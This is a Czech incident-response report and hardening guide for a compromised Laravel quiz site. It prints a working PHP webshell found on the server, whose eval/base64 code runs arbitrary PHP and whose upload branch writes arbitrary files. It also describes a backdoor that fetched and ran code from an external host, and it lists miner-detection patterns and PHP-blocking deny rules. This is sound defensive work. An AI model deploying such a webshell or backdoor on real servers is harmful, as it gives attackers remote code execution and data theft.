# 🔒 Bezpečnostní analýza a hardening — Pioneer Beer Quiz

> Datum analýzy: 2026-03-04
> Prostředí: Laravel 11, Livewire, Filament, VPS (Apache/Nginx)

---

## 🚨 Co se stalo — analýza útoku

### ✅ POTVRZENÝ vstupní bod: webshell `accesson.php`

Na produkčním serveru byl nalezen tento soubor:

```
/pioneerbeerquiz.cz/www/public/assets/images/accesson.php
```

Obsah:
```php
<?php echo 409723*20;
if(md5($_COOKIE["d"])=="17028f487cb2a84607646da3ad3878ec"){
    echo "ok";
    eval(base64_decode($_REQUEST["id"]));        // spustí libovolný PHP kód
    if($_POST["up"]=="up"){
        @copy($_FILES["file"]["tmp_name"], $_FILES["file"]["name"]); // nahraje libovolný soubor
    }
}?>
```

**Co tento soubor dělá:**
1. Autentizace přes cookie `d` (md5 hash) — skryje shell před náhodným crawlerem
2. `eval(base64_decode($_REQUEST["id"]))` — útočník pošle libovolný PHP kód a server ho spustí (kryptoměnový miner, čtení `.env`, mazání souborů, spam…)
3. `@copy($_FILES["file"]["tmp_name"], $_FILES["file"]["name"])` — nahraje libovolný soubor kamkoliv na disk (tzv. dropper pro další backdoory)

**Jak se webshell dostal na server:**
Adresář `public/assets/images/` neměl blokované spouštění PHP souborů.
Útočník s největší pravděpodobností:
- Využil **Livewire Gallery upload** — chyběla autentizace, validace MIME typů byla poškozená (`imagemax:1024` místo `image|max:1024`), takže mohl nahrát `.php` soubor zamaskovaný jako obrázek
- Alternativně: FTP/SFTP s odcizeným/slabým heslem, nebo kompromitovaný hosting panel

### Injektovaný backdoor v `public/index.php`

Poté, co útočník získal přístup přes webshell, **přepsal `index.php`** sofistikovaným backdoorem:
1. **Redirect backdoor** — přesměrovával návštěvníky na phishing/spam weby
2. **Remote code execution** — stahoval a spouštěl kód z `https://zs082dj13ko8.catchare.biz/` přes `eval()`
3. **Self-destruct** — shell se uměl skrýt před inspekcí pomocí `?of=1`

---

## ⚠️ Odpověď na otázku o těžbě kryptoměn

**Ano, je to velmi pravděpodobné.** Backdoor obsahoval `eval()` volající kód stažený z externího serveru. Útočník mohl kdykoliv poslat payload s XMRig minerem. Zkontrolujte:

```bash
# Podezřelé procesy
ps aux | grep -E 'xmrig|minerd|cryptonight|monero|kswapd0|kdevtmpfsi'
top -b -n 1 | sort -k 9 -rn | head -20

# Podezřelá síťová spojení (těžebné pooly jsou na portech 3333, 4444, 14444, 45560)
ss -tulnp | grep -E '3333|4444|14444|45560'
netstat -tulnp 2>/dev/null | grep -E '3333|4444|14444'

# Cron joby
crontab -l; sudo crontab -l; sudo crontab -u www-data -l
cat /etc/cron.d/* /etc/crontab 2>/dev/null
```

---

## 🚀 Co MUSÍTE udělat NA SERVERU — OKAMŽITĚ

### Krok 1 — Smazat webshell a zkontrolovat další soubory

```bash
# Smazat potvrzený webshell
rm -f /var/www/pioneerbeerquiz.cz/public/assets/images/accesson.php

# Najít a smazat VŠECHNY PHP soubory v adresářích statických souborů
find /var/www/pioneerbeerquiz.cz/public -name "*.php" ! -name "index.php" -ls
find /var/www/pioneerbeerquiz.cz/public -name "*.php" ! -name "index.php" -delete
find /var/www/pioneerbeerquiz.cz/public -name "*.phtml" -delete
find /var/www/pioneerbeerquiz.cz/public -name "*.phar" -delete

# Obnovit čistý index.php z gitu
git checkout HEAD -- public/index.php

# Zkontrolovat ostatní pozměněné soubory
git status
git diff --stat
```

### Krok 2 — Změnit VŠECHNA hesla a přístupy

```
- SSH klíče: vygenerovat nový pár, starý zrušit v ~/.ssh/authorized_keys
- Heslo k VPS / hosting panelu (cPanel / Plesk / ISPConfig)
- Heslo k databázi + vygenerovat nový DB user
- APP_KEY: php artisan key:generate
- Hesla všech Filament/Laravel admin účtů
- FTP: ideálně úplně zakázat, používat jen SFTP/SSH
```

### Krok 3 — Nastavit `.env` správně na produkci

```env
APP_ENV=production
APP_DEBUG=false        # KRITICKÉ — nikdy true na produkci!
APP_URL=https://pioneerbeerquiz.cz
```

### Krok 4 — Opravit oprávnění souborů

```bash
# Soubory čitelné webovým serverem, ale NE zapisovatelné
find /var/www/pioneerbeerquiz.cz -type f -exec chmod 640 {} \;
find /var/www/pioneerbeerquiz.cz -type d -exec chmod 750 {} \;

# Výjimky: storage a cache musí být zapisovatelné
chmod -R 770 /var/www/pioneerbeerquiz.cz/storage
chmod -R 770 /var/www/pioneerbeerquiz.cz/bootstrap/cache

# .env jen pro vlastníka
chmod 600 /var/www/pioneerbeerquiz.cz/.env
```

### Krok 5 — Nginx konfigurace (pokud používáte Nginx místo Apache)

```nginx
server {
    # Blokovat PHP v jakémkoliv podadresáři kromě rootu (index.php)
    location ~* ^/(?!index\.php$).+\.php$ {
        deny all;
        return 403;
    }

    # Blokovat PHP v assets/images, storage atd.
    location ~* \.(php|phtml|phar)$ {
        deny all;
        return 403;
    }

    # Blokovat .env a citlivé soubory
    location ~ /\.(env|git|htaccess|svn) {
        deny all;
        return 404;
    }

    # Security headers
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
}
```

### Krok 6 — Firewall

```bash
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow ssh
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp
sudo ufw enable

# Fail2ban pro SSH
sudo apt install fail2ban -y
```

### Krok 7 — Integrity monitoring (cron)

```bash
# Každou hodinu zkontrolovat integritu souborů
echo "0 * * * * /var/www/pioneerbeerquiz.cz/scripts/check-integrity.sh >> /var/log/beer-quiz-integrity.log 2>&1" | crontab -
```

---

## ✅ Opravy provedené v kódu (commitnuté do gitu)

| Soubor | Změna |
|--------|-------|
| `app/Providers/AppServiceProvider.php` | Odstraněno `Model::unguard()` — vypínalo mass-assignment ochranu na VŠECH modelech |
| `app/Livewire/Gallery.php` | Přidána autorizace, opravena validace MIME typů, uložení mimo web root, sanitizace filename |
| `app/Models/User.php` | `canAccessPanel()` omezeno — dříve ANY user mohl do Filament adminu |
| `public/.htaccess` | Security headers, blokování PHP mimo index.php, blokování scanner cest |
| `public/storage/.htaccess` | Blokování PHP spuštění v public/storage |
| `public/images/.htaccess` | Blokování PHP v adresáři obrázků |
| `public/css/.htaccess` | Blokování PHP v CSS adresáři |
| `public/js/.htaccess` | Blokování PHP v JS adresáři |
| `public/favicon/.htaccess` | Blokování PHP v favicon adresáři |
| `scripts/check-integrity.sh` | Automatická detekce webshellů a změn v souborech |
| `scripts/deploy-secure.sh` | Bezpečný deploy skript s kontrolou integrity |

**DŮLEŽITÉ:** Po `git pull` na serveru ihned spusťte:
```bash
# Vytvořit baseline pro integrity check (první spuštění)
bash scripts/check-integrity.sh

# Příště deploy přes:
bash scripts/deploy-secure.sh
```

---

## 🔮 Dlouhodobá doporučení

| Doporučení | Priorita |
|-----------|---------|
| **Cloudflare WAF** před serverem — DDoS ochrana, Rate Limiting, blokování scanner botů | 🔴 Nejvyšší |
| **Automatické bezpečnostní aktualizace** (`unattended-upgrades` na Ubuntu/Debian) | 🔴 Vysoká |
| **Deploy přes CI/CD** (GitHub Actions) — žádný ruční přístup přes FTP | 🔴 Vysoká |
| **Pravidelná záloha DB** na externí úložiště (S3, B2) | 🔴 Vysoká |
| **Read-only filesystem** pro web root — pouze storage/ je writable | 🟠 Střední |
| **2FA pro SSH** (`AuthenticationMethods publickey,keyboard-interactive`) | 🟠 Střední |
| `composer audit` a `npm audit` v CI pipeline | 🟡 Nízká |

